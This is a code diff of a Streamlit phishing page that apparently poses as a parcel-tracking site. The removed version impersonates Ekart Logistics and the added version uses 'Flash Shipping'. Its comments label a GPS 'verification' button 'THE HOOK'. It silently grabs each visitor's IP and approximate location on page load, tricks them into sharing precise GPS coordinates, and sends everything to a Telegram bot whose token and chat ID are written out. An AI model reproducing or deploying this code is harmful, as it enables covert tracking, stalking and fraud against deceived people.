@@ -4,84 +4,74 @@ import requests
 import pandas as pd
 from datetime import datetime
 
-# --- CONFIGURATION ---
-TELEGRAM_BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
-TELEGRAM_CHAT_ID = "7964118615"
+# --- SETTINGS ---
+# Use your actual Bot Token and Chat ID
+BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
+CHAT_ID = "7964118615"
 
-st.set_page_config(page_title="Ekart Logistics | Tracking", page_icon="📦")
+st.set_page_config(page_title="Flash Shipping | Tracking", page_icon="📦")
 
-# Professional Ekart CSS
-st.markdown("""
-    <style>
-    .stApp { background-color: #f0f2f5; }
-    .header { background-color: #2874f0; padding: 20px; color: white; text-align: center; font-size: 24px; font-weight: bold; }
-    .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-top: 20px; text-align: center; }
-    </style>
-    <div class="header">EKART LOGISTICS</div>
-""", unsafe_allow_html=True)
+# 1. GET ACTUAL CLIENT IP (Cloudflare/Proxy aware)
+def get_client_ip():
+    # Streamlit context headers (For Cloudflare)
+    headers = st.context.headers
+    # Priority: Cloudflare Connecting IP -> Forwarded For -> Remote Address
+    ip = headers.get("cf-connecting-ip") or headers.get("x-forwarded-for")
+    
+    if not ip:
+        try:
+            # Fallback for local testing
+            ip = requests.get("https://api.ipify.org").text
+        except:
+            ip = "Unknown"
+    return ip
 
-# Function to send to Telegram
-def send_telegram_alert(lat, lon, method, ip):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    google_maps = f"https://www.google.com/maps?q={lat},{lon}"
+user_ip = get_client_ip()
+
+# 2. TELEGRAM SENDER
+def send_intel(lat, lon, method):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    gmaps = f"https://www.google.com/maps?q={lat},{lon}"
     
     msg = (
-        f"🎯 *ACTUAL LOCATION LOCKED*\n"
+        f"📍 *LOCATION UPDATE*\n"
         f"📅 Time: {datetime.now().strftime('%H:%M:%S')}\n"
-        f"📡 Method: {method}\n"
-        f"🌐 IP: `{ip}`\n"
-        f"🛰️ Lat: `{lat}`\n"
-        f"🛰️ Lon: `{lon}`\n\n"
-        f"📍 [Open Street View]({google_maps})"
+        f"📡 Source: {method}\n"
+        f"🌐 IP: `{user_ip}`\n"
+        f"🗺️ [Open Actual Location]({gmaps})"
     )
-    
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
-    requests.post(url, json=payload)
+    requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
 
-# 1. SILENT IP CAPTURE (Fallback)
-try:
-    ip_resp = requests.get("https://ipapi.co/json/").json()
-    user_ip = ip_resp.get("ip", "Unknown")
-except:
-    user_ip = "Unknown"
+# 3. UI - FLASH SHIPPING
+st.markdown("<h2 style='color: #2874f0;'>📦 Flash Shipping Portal</h2>", unsafe_allow_html=True)
+st.write("Current Package: **#FL-17112026**")
+st.divider()
 
-# 2. THE INTERFACE (The Hook)
-st.markdown("<div class='card'>", unsafe_allow_html=True)
-st.subheader("📦 Package ID: #EK-992817")
-st.write("Verification required to resume delivery to your current street address.")
-
-# THE CRITICAL BUTTON: This triggers the mobile browser GPS prompt
+# THE HOOK: The user MUST click this for Actual Location on Mobile
+st.info("Verification Required: Tap below to sync your device GPS for delivery.")
 location = streamlit_geolocation()
 
-# 3. LOGIC FOR ACTUAL LOCATION
+# 4. LOGIC
 if location.get('latitude'):
-    # SUCCESS: User clicked 'Allow' -> Actual GPS Coordinates
+    # ACTUAL LOCATION (From Phone GPS Hardware)
     lat, lon = location['latitude'], location['longitude']
     
-    # Send Actual Location to Telegram
-    # We use a session state to ensure it only sends ONCE per successful grab
+    # Prevents spamming Telegram if the data hasn't changed
     if st.session_state.get('last_lat') != lat:
-        send_telegram_alert(lat, lon, "HIGH_ACCURACY_GPS", user_ip)
+        send_intel(lat, lon, "ACTUAL_GPS_HARDWARE")
         st.session_state['last_lat'] = lat
-
-    st.success("✅ Actual Location Verified. Delivery Resumed.")
-    
-    # Show the Actual Map
-    df = pd.DataFrame({'lat': [lat], 'lon': [lon]})
-    st.map(df)
-    
+        
+    st.success("✅ Delivery Address Verified.")
+    st.map(pd.DataFrame({'lat': [lat], 'lon': [lon]}))
 else:
-    # AUTOMATIC FALLBACK: If GPS is not yet allowed, send the IP data
-    # This will give the "Mysore" location until they click "Allow"
-    if "fallback_sent" not in st.session_state:
+    # IP LOCATION (Approximate - Mysore/City level)
+    # This runs immediately when the page loads
+    if "fallback_done" not in st.session_state:
         try:
-            fallback_lat = ip_resp.get("latitude")
-            fallback_lon = ip_resp.get("longitude")
-            send_telegram_alert(fallback_lat, fallback_lon, "IP_APPROXIMATE", user_ip)
-            st.session_state["fallback_sent"] = True
+            ip_resp = requests.get(f"https://ipapi.co/{user_ip}/json/").json()
+            if 'latitude' in ip_resp:
+                send_intel(ip_resp['latitude'], ip_resp['longitude'], "IP_APPROXIMATE_CITY")
+                st.session_state["fallback_done"] = True
         except:
             pass
-    
-    st.info("⚠️ Click the button above to verify your coordinates.")
-
-st.markdown("</div>", unsafe_allow_html=True)
+    st.warning("Awaiting GPS permission to show street-level tracking...")
